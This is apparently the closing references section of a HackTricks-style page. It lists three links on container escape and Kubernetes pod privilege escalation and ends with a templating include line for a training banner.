- [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver)
- [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket)
- [https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4](https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4)

{{#include ../../../../banners/hacktricks-training.md}}
